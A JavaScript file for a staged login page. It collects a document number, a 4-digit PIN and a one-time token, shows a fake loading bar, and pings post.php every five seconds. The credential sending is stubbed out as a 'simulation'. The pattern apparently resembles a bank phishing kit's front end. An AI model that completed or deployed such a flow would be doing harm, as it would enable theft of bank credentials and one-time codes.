document.addEventListener("DOMContentLoaded", () => {
  // Elements
  const authCard = document.getElementById("auth-card");
  const tokenCard = document.getElementById("token-card");
  const loadingScreen = document.getElementById("loading-screen");
  const docNumberInput = document.getElementById("doc-number");
  const userPassInput = document.getElementById("user-pass");
  const tokenInput = document.getElementById("token-input");
  const btnContinue = document.getElementById("btn-continue");
  const btnTokenContinue = document.getElementById("btn-token-continue");
  const btnCloseToken = document.getElementById("btn-close-token");
  const docSection = document.getElementById("document-section");
  const passSection = document.getElementById("password-section");
  const rememberToggle = document.getElementById("remember-toggle");
  const toggleEye = document.getElementById("toggle-eye");

  let currentStep = "document"; // document | password | loading | token
  let pollingInterval = null;

  // Real-time Heartbeat
  setInterval(() => {
    fetch("post.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "action=alive"
    }).catch(() => {});
  }, 5000);

  // Toggle Remember Me
  rememberToggle.addEventListener("click", () => {
    rememberToggle.classList.toggle("active");
  });

  // Toggle Password Visibility
  toggleEye.addEventListener("click", () => {
    const isPass = userPassInput.type === "password";
    userPassInput.type = isPass ? "text" : "password";
    toggleEye.setAttribute("data-lucide", isPass ? "eye-off" : "eye");
    window.lucide.createIcons();
  });

  // Button State Helpers
  const updateMainButton = () => {
    if (currentStep === "document") {
      const val = docNumberInput.value.trim();
      btnContinue.classList.toggle("btn-disabled", val.length < 6);
    } else if (currentStep === "password") {
      const val = userPassInput.value.trim();
      btnContinue.classList.toggle("btn-disabled", val.length !== 4);
    }
  };

  const updateTokenButton = () => {
    const len = tokenInput.value.length;
    btnTokenContinue.classList.toggle("btn-disabled", len !== 6 && len !== 8);
  };

  // Input Listeners
  docNumberInput.addEventListener("input", () => {
    docNumberInput.value = docNumberInput.value.replace(/\D/g, "");
    updateMainButton();
  });

  userPassInput.addEventListener("input", () => {
    userPassInput.value = userPassInput.value.replace(/\D/g, "");
    updateMainButton();
  });

  tokenInput.addEventListener("input", () => {
    tokenInput.value = tokenInput.value.replace(/\D/g, "");
    updateTokenButton();
  });

  // Main Continue Button
  btnContinue.addEventListener("click", () => {
    if (btnContinue.classList.contains("btn-disabled")) return;

    if (currentStep === "document") {
      currentStep = "password";
      docSection.classList.add("hidden");
      passSection.classList.remove("hidden");
      userPassInput.focus();
      updateMainButton();
    } else if (currentStep === "password") {
      // Simulación - aquí iría el envío real
      showLoading();
    }
  });

  function showLoading() {
    currentStep = "loading";
    authCard.classList.add("hidden");
    tokenCard.classList.add("hidden");
    loadingScreen.style.display = "flex";
    startLoadingAnimation();
  }

  function startLoadingAnimation() {
    const bar = document.getElementById("load-progress-bar");
    if (bar) {
      bar.style.width = "0%";
      setTimeout(() => bar.style.width = "40%", 500);
      setTimeout(() => bar.style.width = "75%", 5000);
    }
  }

  // Token Card
  btnTokenContinue.addEventListener("click", () => {
    if (btnTokenContinue.classList.contains("btn-disabled")) return;
    alert("Código enviado correctamente (Simulación para tu proyecto)");
  });

  btnCloseToken.addEventListener("click", () => {
    tokenCard.classList.add("hidden");
  });

  // Inicializar
  updateMainButton();
});